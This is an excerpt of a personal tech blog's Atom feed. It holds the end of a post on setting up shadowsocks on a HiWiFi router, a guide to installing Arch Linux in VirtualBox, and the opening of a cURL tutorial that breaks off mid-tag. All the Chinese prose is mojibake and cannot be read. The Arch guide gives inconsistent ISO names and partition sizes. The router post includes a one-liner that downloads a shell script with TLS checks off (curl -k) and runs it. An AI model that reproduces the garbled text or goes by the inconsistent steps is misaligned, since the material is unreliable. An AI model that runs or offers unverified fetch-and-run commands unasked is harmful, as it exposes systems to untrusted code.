æ³•è®¿é—®çš„é—®é¢˜;</li></ol><h3><span id="an-zhuang-guo-cheng">å®‰è£…è¿‡ç¨‹</span></h3><p>(1). å¼€å¯æè·¯ç”±å¼€å‘è€…æ¨¡å¼</p><p>éœ€è¦å¼€å‘è€…æ¨¡å¼æ‰èƒ½å®‰è£…. ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹,ä¸èµ˜è¿°.</p><p>(2). ç™»å½•è·¯ç”±å™¨, ä¸€é”®å®‰è£…è„šæœ¬.</p><p>æè·¯ç”±é»˜è®¤å¼€å¯1022ç«¯å£ä½œä¸ºsshç«¯å£,æ•…ä½¿ç”¨<code>ssh root@192.168.199.1 -p 1022</code>ç™»å½•è·¯ç”±å™¨,è¿è¡Œå¦‚ä¸‹ä¸€é”®è„šæœ¬:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; curl -k -o shadow.sh https://raw.githubusercontent.com/qiwihui/hiwifi-ss/master/shadow.sh &amp;&amp; sh shadow.sh &amp;&amp; <span class="built_in">rm</span> shadow.sh</span><br></pre></td></tr></table></figure><p>ç„¶åç™»å½•åå°ç®¡ç†ç•Œé¢,åœ¨<code>äº’è”ç½‘</code>èœå•ä¸‹çš„<code>shadowsocksè®¾ç½®</code>é…ç½®ssè´¦å·å°±å¯ä»¥äº†.</p><h2><span id="yi-xie-zhan-wang">ä¸€äº›å±•æœ›</span></h2><p>æœªæ¥è¦åšçš„ä¸€äº›å·¥ä½œ:</p><ol><li>åŠŸèƒ½çš„æ”¹è¿›: åŒ…æ‹¬ä½†ä¸é™äºssç‰ˆæœ¬çš„æ›´æ–°, è§„åˆ™çš„æ›´æ–°, æµé‡æ··æ·†ç­‰;</li><li>å¯èƒ½æ”¯æŒæ›´å¤šç§ç±»çš„å·¥å…·;</li><li>æœ€é‡è¦çš„æ˜¯: å¼€æº. åŒ…æ‹¬åº•å±‚çš„ä»£ç é‡å†™æˆ–è€…æ˜¯æ‰¾åˆ°ä¹‹å‰çš„ä»£ç .</li></ol><h2><span id="yi-xie-gan-xiang">ä¸€äº›æ„Ÿæƒ³</span></h2><ul><li>&quot;å…è´¹&quot;æ˜¯æœ€è´µçš„</li></ul><p>æ€ä¹ˆè¯´å‘¢, æˆ‘åœ¨æœ€å¼€å§‹çš„æ—¶å€™, å¯»æ‰¾å…è´¹çš„vpnæ˜¯è·å¾—ç¿»å¢™çš„å”¯ä¸€æ–¹å¼, è¿™ç§æ–¹å¼çš„ä¸å¥½ä¹‹å¤„åœ¨äº: vpnä¸ç¨³å®š, ç»å¸¸æ¢,è€Œä¸”èŠ±è´¹åœ¨å¯»æ‰¾ä¸Šçš„ç²¾åŠ›å’Œæ—¶é—´ç®—ä¸‹æ¥ä¸åˆç®—. ä¹‹åç²¾åŠ›äº†<code>åœ°ä¸‹é“è·¯vpn</code>çš„æ¶ˆå¤±ä¹‹å, è‡ªå·±æ­å»ºç¿»å¢™æ‰æˆä¸ºæˆ‘çš„ä¸»è¦ç¿»å¢™æ–¹å¼. ä¸€ä¸ªæœˆèŠ±è´¹çš„è´¹ç”¨ä¸åˆ°10ç¾å…ƒ, å¸¦æ¥çš„æ—¶ç¨³å®šçš„æµé‡å’Œæ–¹å¼. VPS+shadowsocks/v2rayå°±å¯ä»¥æä¾›ç¨³å®šæŒä¹…çš„æ–¹å¼.</p><ul><li>é£é™©</li></ul><p>ä¸æ€ä¹ˆä½¿ç”¨vpn(å…è´¹æˆ–è€…æ”¶è´¹)ä»¥åŠä¸€äº›å…¶ä»–çš„æ”¶è´¹ç¿»å¢™æœåŠ¡ï¼Œä¸€åˆ™æ‹…å¿ƒä¸å®‰å…¨, æµé‡åŠ«æŒæˆ–è€…æµé‡åˆ†æéƒ½æœ‰å¯èƒ½ï¼Œç”šè€…èœœç½,äºŒåˆ™æ˜¯é‡ç‚¹è§‚å¯Ÿå¯¹è±¡, æœåŠ¡å¤±æ•ˆçš„å¯èƒ½æ€§è¿˜æ˜¯å­˜åœ¨çš„. å› æ­¤, åŠ å¯†ç¿»å¢™æµé‡å’Œæ··æ·†ç¿»å¢™è¡Œä¸ºæ—¶ååˆ†é‡è¦çš„è¿‡ç¨‹.</p><ul><li>æŠ€æœ¯äººå‘˜è·å–èµ„è®¯å’Œä¿¡æ¯çš„å¹¿åº¦å’ŒåŠæ—¶æ€§</li></ul><p>å› ä¸ºGFW, å¢™å†…å°é—­çš„ç¯å¢ƒä½¿å¾—è·å–æŠ€æœ¯çŸ¥è¯†çš„å¹¿åº¦å’ŒåŠæ—¶æ€§éƒ½å—åˆ°äº†å¾ˆä¸¥é‡çš„å½±å“, ç¿»å¢™è®©ææŠ€æœ¯çš„æˆ‘ä»¬ä¸ä¸–ç•Œæ›´æ¥è¿‘.</p><p>åˆ†äº« <a href="https://twitter.com/lepture">@lepture</a>çš„ä¸€ä¸ªtweet:</p><blockquote><p>ã€Œæˆ‘çš„äº’è”ç½‘ï¼Œä¸Šè°·æ­Œç»´åŸºæœçŸ¥è¯†ï¼Œä¸ŠRedditçœ‹çœ‹å¤´æ¡ï¼Œä¸ŠYouTubeå­¦ä¹ å’Œå¼€çœ¼ç•Œï¼Œä¸ŠTwitterå…³æ³¨ä¸€äº›æ­£åœ¨æ”¹å˜ä¸–ç•Œçš„äººå’Œäº‹ï¼Œå»Quoraä¸Šçœ‹çœ‹å¥½çš„é—®é¢˜å’Œå›ç­”ï¼Œå»SlideShareä¸Šå­¦ä¹ ä»¥åŠäº†è§£ä¸åŒçš„æƒ³æ³•å’Œè§‚ç‚¹ã€</p></blockquote><h2><span id="zong-jie">æ€»ç»“</span></h2><p>ç¿»å¢™åœ¨äºä¸æ–­æŠ˜è…¾.</p><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/21#issuecomment-452180352"><strong>wanjunlengfeng</strong></a> on: <strong>1/8/2019</strong></p></blockquote><p>æˆ‘æŠŠä½ çš„å¯åŠ¨æ–¹æ¡ˆä¿®æ”¹äº†!!åªå¼€å¯61080ç«¯å£,ç»“æŸå…¨å±€GFW, è®©å„è‡ªçš„ç”µè„‘å»é“¾æ¥61080vi /etc/init.d/gw-shadowsocks`#service_start /usr/bin/ss-redir -s $server -p $server_port -b 0.0.0.0 -l $rs_port -k $password -t $timeout -m $method $params</p><h1><span id="service-start-usr-bin-dns2socks-127-0-0-1-local-port-dnsserver-127-0-0-1-53535-d-q">service_start /usr/bin/dns2socks 127.0.0.1:$local_port $dnsserver 127.0.0.1:53535 -d -q</span></h1><p>#/etc/init.d/gw-redsocks start`æˆ‘æŠŠè¿™3è¡Œä»£ç æ³¨é”€äº†!!å¸Œæœ›ä½œè€…èƒ½å¢åŠ httpä»£ç†åè®®,å¹¶ä¸”åœ¨è·¯ç”±å™¨åå°å¯ä»¥è‡ªå®šä¹‰æ˜¯å¦å…¨å±€ç¿»å¢™.è¿™æ ·å°±å®Œç¾äº†</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/21#issuecomment-491642520"><strong>nonskim</strong></a> on: <strong>5/13/2019</strong></p></blockquote><p>å­¦æ ¡çš„ç½‘ç»œï¼Œæœ¬æ¥å¯ä»¥ç”¨å¤–æ–‡æ–‡çŒ®åº“ï¼Œç”¨äº†è¿™ä¸ªï¼Œä¸Šä¸äº†æ€ä¹ˆè§£å†³</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/21#issuecomment-546828319"><strong>stonelf</strong></a> on: <strong>10/28/2019</strong></p></blockquote><p>æ”¯æŒå“ªå‡ æ¬¾æè·¯ç”±ï¼Ÿ</p>]]></content>
    
    <summary type="html">
    
      æè·¯ç”±+shadowsocksç¿»å¢™
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨VirtualBoxå®‰è£…Arch Liuxåˆæ­¥æŒ‡å—</title>
    <link href="https://qiwihui.com/qiwihui-blog-20/"/>
    <id>https://qiwihui.com/qiwihui-blog-20/</id>
    <published>2018-10-09T05:36:09.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>ç®€å•åœ°å†™ä¸€ä¸‹åœ¨VirtualBoxä¸Šå®‰è£…Arch Linuxçš„è¿‡ç¨‹ï¼Œä»¥æ­¤ä¸ºåœ¨PCä¸Šå®‰è£…åšå‡†å¤‡ã€‚åœ¨PCä¸Šå®‰è£…çš„è¿‡ç¨‹å’Œä¸‹é¢æè¿°çš„åŸºæœ¬ä¸€è‡´ã€‚</p><span id="more"></span><p>##0x00 å‡†å¤‡</p><ol><li><p>ä¸‹è½½isoæ–‡ä»¶ï¼šåœ¨Archå®˜ç½‘ä¸Š<a href="https://www.archlinux.org/download/">ä¸‹è½½</a>æœ€æ–°çš„é•œåƒï¼Œè¿™é‡Œæˆ‘é€‰ç”¨äº†<a href="http://mirrors.163.com/archlinux/iso/2015.01.01/">163.com</a>èŠ‚ç‚¹çš„èµ„æºï¼Œä¸‹è½½archlinux-2015.01.01-dual.isoï¼›</p></li><li><p>æ£€æŸ¥æ–‡ä»¶çš„å®Œæ•´æ€§ï¼šåœ¨MACä¸­ä½¿ç”¨md5æˆ–è€…sha1æ£€éªŒæ–‡ä»¶çš„å®Œæ•´è¡Œï¼Œå¹¶å’Œä¸‹è½½ç«™ç‚¹æä¾›çš„å€¼è¿›è¡Œæ¯”è¾ƒã€‚</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ openssl sha1 archlinux-2014.12.01-dual.iso </span><br><span class="line">SHA1(archlinux-2014.12.01-dual.iso)= 86085153f97f0097fd0a02496e67cf85138c1ba5</span><br><span class="line"></span><br><span class="line">$ md5 archlinux-2014.12.01-dual.iso </span><br><span class="line">MD5 (archlinux-2014.12.01-dual.iso) = 667ed3c5e935666edfd54a2271e05b72</span><br></pre></td></tr></table></figure></li></ol><p>##0x01 åˆ›å»ºè™šæ‹Ÿæœº</p><ol><li><p>ç»™è™šæ‹Ÿæœºä¸€ä¸ªåå­—<img src="/media/files/2015/Jan/0-NameAndOperatingSystem.png"><img></p></li><li><p>å†…å­˜ï¼šæœ€å°ä¸º256MB<img src="/media/files/2015/Jan/1-MemorySize.png"><img></p></li><li><p>åˆ›å»ºæ–°çš„è™šæ‹Ÿç£ç›˜<img src="/media/files/2015/Jan/2-HardDrive.png"><img></p></li><li><p>æ–‡ä»¶ç±»å‹<img src="/media/files/2015/Jan/3-HardDriveFileType.png"><img></p></li><li><p>åŠ¨æ€åˆ†é…<img src="/media/files/2015/Jan/4-StorageOnPhysicalHardDrive.png"><img></p></li><li><p>æ–‡ä»¶ä½ç½®å’Œå¤§å°ï¼Œæœ€å°10GB<img src="/media/files/2015/Jan/5-FileLocationAndSize.png"><img></p></li><li><p>å¦‚æœè¦å®‰è£…æ¡Œé¢ç¯å¢ƒçš„è¯å°±å‹¾é€‰<code>Enable 3D Acceleration</code><img src="/media/files/2015/Jan/6-Enable3DAcceleration.png"><img></p></li><li><p>ç¬¬ä¸€æ¬¡å¯åŠ¨è™šæ‹Ÿæœºæ—¶ï¼Œé€‰å–ä¹‹å‰ä¸‹è½½çš„ISOæ–‡ä»¶<img src="/media/files/2015/Jan/7-SelectISOFile.png"><img></p></li></ol><p>##0x01 å¼€å§‹å®‰è£…</p><ol><li><p>é€‰æ‹©32ä½æˆ–è€…64ä½Arch<img src="/media/files/2015/Jan/8-BootArchLinux.png"><img></p><p>ä¸€æ—¦çœ‹åˆ°å¦‚ä¸‹æç¤ºï¼Œå°±å¯ä»¥å¼€å§‹è¿›è¡Œé…ç½®äº†ï¼š<img src="/media/files/2015/Jan/9-Command.png"><img></p></li><li><p>æ›´æ”¹é”®ç›˜å¸ƒå±€å’Œè®¾ç½®è¯­è¨€ï¼š</p><p>é»˜è®¤é”®ç›˜å¸ƒå±€ä¸º<code>us</code>ï¼Œéuså¸ƒå±€å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤ä¿®æ”¹ï¼š</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># loadkeys layout</span></span><br></pre></td></tr></table></figure><p>layoutå¯ä»¥æ˜¯<code>uk</code>, <code>dvorak</code>ç­‰ã€‚è®¾ç½®è¯­è¨€ï¼š</p></li><li><p>ç£ç›˜åˆ†åŒº</p><p>å…ˆçœ‹ä¸€ä¸‹ç£ç›˜çŠ¶æ€ï¼š</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls /dev</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹å•¦ï¼Œä¸€èˆ¬åˆ›å»ºå››ä¸ªåˆ†åŒºï¼š<code>/</code>, <code>/boot</code>, <code>/home</code>, <code>swap</code></p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdisk /dev/sda</span><br></pre></td></tr></table></figure><p>å½“å‡ºç°ä¸‹é¢å‘½ä»¤æ—¶, å¼€å§‹åˆ†åŒºï¼Œä¸€ä¸‹ä»¥<code>/boot</code>åˆ†åŒºä¸ºä¾‹ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Command (? for help):</span><br></pre></td></tr></table></figure><p>a. åˆ›å»ºæ–°åˆ†åŒºï¼š'nâ€™b. åˆ†åŒºå·ç ï¼šå›è½¦é»˜è®¤ä»0å¼€å§‹é€’å¢c. â€œfirst sectorâ€: å›è½¦é»˜è®¤ä»ä¸Šä¸€ä¸ªåˆ†åŒºç»“æŸå¤„å¼€å§‹ï¼Œåˆå§‹ä¸º0d. â€œlast sectorâ€: '+250MBâ€™e. â€œhex codeâ€: å›è½¦é»˜è®¤ï¼ˆ8300 ä¸º&quot;Linux File System&quot;ï¼‰ï¼Œ<code>swap</code>åˆ†åŒºè¾“å…¥8200, è§<a href="http://www.basicconfig.com/hex_codes_system_id">è¿™å„¿</a></p><p>ä¾æ¬¡ç»™<code>swap</code>åˆ†é…â€™+1Gâ€™ï¼ˆå’Œåˆ†é…çš„RAMä¸€æ ·å¤§ï¼‰ï¼Œ<code>/boot</code>åˆ†é…â€™+8Gâ€™ï¼Œ<code>/home</code>åˆ†é…â€™+1Gâ€™ï¼Œå†æ¬¡çœ‹ä¸€ä¸‹ç£ç›˜çš„çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»åˆ†é…å¥½äº†ï¼Œé”®å…¥â€™wâ€™å¹¶å›è½¦å³å¯ä¿å­˜ä¿®æ”¹ã€‚</p></li><li><p>æ ¼å¼åŒ–åˆ†åŒº</p><p>å†æ¬¡å›åˆ°å‘½ä»¤è¡Œï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@archiso ~ #</span><br></pre></td></tr></table></figure><p>æ ¼å¼åŒ–åˆ†åŒºï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mkfs -t ext4 /dev/sda1</span><br><span class="line"># mkfs -t ext4 /dev/sda3</span><br><span class="line"># mkfs -t ext4 /dev/sda4</span><br><span class="line"></span><br><span class="line"># mkswap /dev/sda2</span><br></pre></td></tr></table></figure></li><li><p>æŒ‚è½½æ–°åˆ†åŒº</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># swapon /dev/sda2</span><br><span class="line"></span><br><span class="line"># mount /dev/sda3 /mnt</span><br><span class="line"># cd /mnt</span><br><span class="line"># mkdir boot home</span><br><span class="line"># mount /dev/sda1 boot</span><br><span class="line"># mount /dev/sda4 home</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…Arch</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cd /</span><br><span class="line"># pacstrap /mnt base base-devel</span><br></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆ<code>fstab</code>æ–‡ä»¶</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># genfstab -p /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹çœ‹fstabé‡Œé¢çš„å†…å®¹ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># more /mnt/etc/fstab</span><br></pre></td></tr></table></figure></li><li><p>åˆå§‹åŒ–å®‰è£…Boot Loader</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pacstrap /mnt syslinux</span><br></pre></td></tr></table></figure></li><li><p>é…ç½®å®‰è£…</p><p>è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># arch-chroot /mnt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh-4.2#</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªshellå¾ˆåŸºç¡€ï¼Œç”¨Bashä¹Ÿè®¸æ›´å¥½äº›ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># bash</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@archiso /]#</span><br></pre></td></tr></table></figure><p>è®¾ç½®è¯­è¨€ï¼š</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nano /etc/locale.conf</span></span><br></pre></td></tr></table></figure><p>æ·»åŠ ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LANG=&quot;en_US.UTF-8&quot;</span><br></pre></td></tr></table></figure> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nano /etc/locale.gen</span></span><br></pre></td></tr></table></figure><p>å°†ä¸‹é¢ä¸¤è¡Œå‰é¢<code>#</code>å»é™¤ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">en_US.UTF-8 UTF-8</span><br><span class="line">de_DE.UTF-8 UTF-8</span><br></pre></td></tr></table></figure><p>å®Œæˆè¯­è¨€è®¾ç½®ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># locale-gen</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ—¶é—´ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ln -s /usr/share/zoneinfo/&lt;your_state&gt;/&lt;your_city&gt; /etc/localtime</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘è®¾ç½®çš„æ˜¯ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ln -s /usr/share/zoneinfo/Asia/Chongqing /etc/localtime</span><br></pre></td></tr></table></figure><p>æ”¹hostnameï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nano /etc/hostname</span><br></pre></td></tr></table></figure></li><li><p>å®ŒæˆBootloaderå®‰è£…</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cd /boot/syslinux/</span><br></pre></td></tr></table></figure><p>æ‰“å¼€syslinux.cfgæ–‡ä»¶ï¼Œæ‰¾åˆ°&quot;comboot modules&quot;ä¸€æ®µï¼š</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># more syslinux.cfg</span><br></pre></td></tr></table></figure><p>å°†å…¶ä¸­åˆ—ä¸¾çš„æ–‡ä»¶copyåˆ°æœ¬åœ°ï¼ŒåŒæ—¶è¿˜è¦åŠ ä¸Šâ€™libutil.c32â€™:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cp /usr/lib/syslinux/bios/menu.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/vesamenu.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/chain.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/hdt.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/reboot.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/poweroff.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/libutil.c32 .</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦å®Œæˆä¸Šè¿°è®¾ç½®ï¼Œ</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># extlinux --install /boot/syslinux</span><br><span class="line"># dd conv=notrunc bs=440 count=1 if=/usr/lib/syslinux/bios/gptmbr.bin of=/dev/sda</span><br><span class="line"># mkinitcpio -p linux</span><br></pre></td></tr></table></figure></li><li><p>å®Œæˆå®‰è£…</p><p>æœ€åï¼Œæ›´æ”¹rootå¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># passwd</span><br></pre></td></tr></table></figure><p>è¾“å…¥ä¸¤æ¬¡<code>exit</code>é€€å›åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@archiso /]#</span><br></pre></td></tr></table></figure><p>umountæ‰€æœ‰çš„åˆ†åŒºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># umount /mnt/boot</span><br><span class="line"># umount /mnt/home</span><br><span class="line"># swapoff /dev/sda2</span><br><span class="line"># umount /mnt</span><br></pre></td></tr></table></figure><p>åœ¨é‡å¯ä¹‹å‰æœ€åä¸€æ­¥ï¼Œè®¾ç½®<code>/boot</code>åˆ†åŒºçš„<a href="http://en.wikipedia.org/wiki/BIOS">BIOS</a>æ ‡è¯†ä¸ºâ€™bootableâ€™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sgdisk /dev/sda --attributes=1:set:2</span><br></pre></td></tr></table></figure></li><li><p>é‡å¯Arch</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># reboot</span><br></pre></td></tr></table></figure><p>é‡å¯ä¹‹åä¼šå†æ¬¡è¿›å…¥CDå¯åŠ¨ï¼Œè¿™æ—¶ï¼Œå»é™¤å®‰è£…CDï¼Œå†æ¬¡é‡å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Devices &gt; CD/DVD Devices &gt; Remove disk from virtual drive</span><br></pre></td></tr></table></figure><p>ç­‰å¾…ä¸€å°ä¼šï¼š</p><p><img src="/media/files/2015/Jan/10-ArchLinux.png"><img></p><p>Congradulations!</p></li><li><p>åç»­å·¥ä½œ</p><p>é“¾æ¥ç½‘ç»œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure><p>å®‰è£…â€™sudoâ€™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pacman -S sudo</span><br></pre></td></tr></table></figure><p>æ·»åŠ â€™sudoerâ€™:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nano /etc/sudoers</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##</span><br><span class="line">## User privilege specification</span><br><span class="line">##</span><br><span class="line">root ALL=(ALL) ALL</span><br><span class="line">qiwihui ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><p>ä¿å­˜ï¼Œå¹¶log outï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># exit</span><br></pre></td></tr></table></figure><p>ä»¥æ–°çš„IDå’Œå¯†ç é‡æ–°ç™»å½•ã€‚</p><p>æœ€åï¼Œæ¯æ¬¡ç™»å½•çš„æ—¶å€™è‡ªåŠ¨è·å–ipï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sudo systemctl enable dhcpcd@eth0.service</span><br></pre></td></tr></table></figure></li></ol><p>è¿™æ ·æœ€åŸºæœ¬çš„Arch Linuxå°±å¥½äº†ï¼ŒDesktop Environmentå°±ä¸è£…äº†ã€‚</p><h2><span id="0x02-can-kao-wen-dang">0x02 å‚è€ƒæ–‡æ¡£</span></h2><ul><li><a href="https://wiki.archlinux.org/index.php/Beginners%27_guide">Arch Linux Beginnersâ€™ guide</a></li><li><a href="https://wiki.archlinux.org/index.php/Installation_guide">Arch Linux Installation Guide</a></li><li><a href="http://wideaperture.net/blog/?p=3851">A Guide to Installing Arch in VirtualBox</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      åœ¨VirtualBoxå®‰è£…Arch Liuxåˆæ­¥æŒ‡å—
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>9ä¸ªå€¼å¾—çŸ¥é“çš„cURLçš„ç”¨æ³•</title>
    <link href="https://qiwihui.com/qiwihui-blog-19/"/>
    <id>https://qiwihui.com/qiwihui-blog-19/</id>
    <published>2018-10-09T05:33:38.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>å¯¹äº HTTP å·¥ç¨‹å¸ˆå’Œ API è®¾è®¡å¸ˆæ¥è¯´ï¼Œä½¿ç”¨å‘½ä»¤è¡Œæ“ä½œ HTTP æ˜¯éå¸¸æœ‰ç”¨çš„æŠ€èƒ½ã€‚<a href="http://curl.haxx.se/">cURL</a>åº“å’Œ <code>curl</code> å‘½ä»¤å¯ä»¥ç»™ä½ è®¾è®¡è¯·æ±‚ï¼Œæ”¾å…¥ç®¡é“å¹¶æŸ¥çœ‹ç›¸åº”çš„èƒ½åŠ›ã€‚<code>curl</code> èƒ½åŠ›çš„ç¼ºç‚¹åœ¨äºå®ƒèƒ½è¦†ç›–å¤šå¹¿çš„å‘½ä»¤é€‰é¡¹ã€‚ä½¿ç”¨ <code>curl --help</code> ä¼šå±•ç¤ºå‡º150æ¡ä¸åŒçš„é€‰é¡¹ã€‚è¿™ç¯‡æ–‡ç« æ¼”ç¤ºäº†9ä¸ªåŸºæœ¬çš„ï¼Œç°å®ç¨‹åºç”¨åˆ°çš„ <code>curl</code> å‘½ä»¤ã€‚</p><span id="more"></span><p>åœ¨è¿™ç¯‡æ•™ç¨‹ä¸­æˆ‘ä»¬ä¼šä½¿ç”¨httpkitçš„ <a href="http://echo.httpkit.com/">echo</a> æœåŠ¡åšä¸ºç«¯ç‚¹ï¼Œå›æ˜¾æœåŠ¡çš„å“åº”æ˜¯å®ƒæ”¶åˆ° HTTP è¯·æ±‚çš„ JSON è¡¨ç¤ºã€‚</p><h2><span id="chuang-jian-qing-qiu">åˆ›å»ºè¯·æ±‚</span></h2><p>æˆ‘ä»¬ä»æœ€ç®€å•çš„ <code>curl</code> å‘½ä»¤å¼€å§‹ã€‚</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;GET&quot;,</span><br><span class="line">  &quot;uri&quot;: &quot;/&quot;,</span><br><span class="line">  &quot;path&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;/&quot;,</span><br><span class="line">    &quot;query&quot;: &quot;&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;host&quot;: &quot;echo.httpkit.com&quot;,</span><br><span class="line">    &quot;user-agent&quot;: &quot;curl/7.24.0 ...&quot;,</span><br><span class="line">    &quot;accept&quot;: &quot;*/*&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;body&quot;: null,</span><br><span class="line">  &quot;ip&quot;: &quot;28.169.144.35&quot;,</span><br><span class="line">  &quot;powered-by&quot;: &quot;http://httpkit.com&quot;,</span><br><span class="line">  &quot;docs&quot;: &quot;http://httpkit.com/echo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±è¿™æ ·ï¼Œæˆ‘ä»¬ç”¨ <code>curl</code> åˆ›å»ºäº†ä¸€ä¸ªè¯·æ±‚ï¼Œ<code>curl</code> ä½¿ç”¨çš„ HTTP åŠ¨è¯é»˜è®¤ä¸º <code>GET</code>ï¼Œè¯·æ±‚çš„èµ„æºæŒ‡å‘çš„æ˜¯<a href="http://httpkit.com/">httpkit</a> çš„ <a href="http://httpkit.com/echo">echo</a> æœåŠ¡ï¼š<code>http://echo.httpkit.com</code>ã€‚</p><p>ä½ å¯ä»¥æ·»åŠ è·¯å¾„å’ŒæŸ¥è¯¢å˜é‡ï¼š</p><p><strong>è¯·æ±‚</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://echo.httpkit.com//path?query=string</span><br></pre></td></tr></table></figure><p><strong>å“åº”</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; ...</span><br><span class="line">  &quot;uri&quot;: &quot;/path?query=string&quot;,</span><br><span class="line">  &quot;path&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;/path&quot;,</span><br><span class="line">    &quot;query&quot;: &quot;?query=string&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &quot;string&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span 